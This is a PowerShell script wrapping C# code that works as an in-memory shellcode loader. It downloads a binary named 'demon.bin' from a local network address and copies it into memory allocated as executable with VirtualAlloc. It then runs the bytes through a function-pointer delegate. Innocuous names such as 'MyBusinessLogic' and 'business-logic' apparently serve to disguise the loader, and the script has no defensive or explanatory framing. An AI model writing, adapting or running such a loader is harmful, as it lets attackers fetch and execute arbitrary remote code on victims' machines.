$MyBusinessLogic = @"
using System;
using System.Net;
using System.Runtime.InteropServices;

public class MyBusinessLogic {
    static byte[] my_buf;

    // declaring VirtualAlloc function from kernel32.dll
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);

    // create delegate signature for executor function
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void WindowRun();

    public static void Main() {
        // URL of the binary file
        string url = "http://192.168.11.129:8000/demon.bin";

        // Download the binary data
        using (WebClient webClient = new WebClient())
        {
            my_buf = webClient.DownloadData(url);
        }

        // get pointer of allocated buffer
        IntPtr my_virt_alloc_pointer = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(my_buf.Length), 0x1000, 0x40);

        // write the buffer into memory
        Marshal.Copy(my_buf, 0, my_virt_alloc_pointer, my_buf.Length);

        // get function pointer of the allocated buffer
        WindowRun business_run_logic = Marshal.GetDelegateForFunctionPointer<WindowRun>(my_virt_alloc_pointer);

        // run "business-logic"
        business_run_logic();
    }
}
"@

# specifying Add-Type will force .NET to compile C# code
Add-Type $MyBusinessLogic

[MyBusinessLogic]::Main()
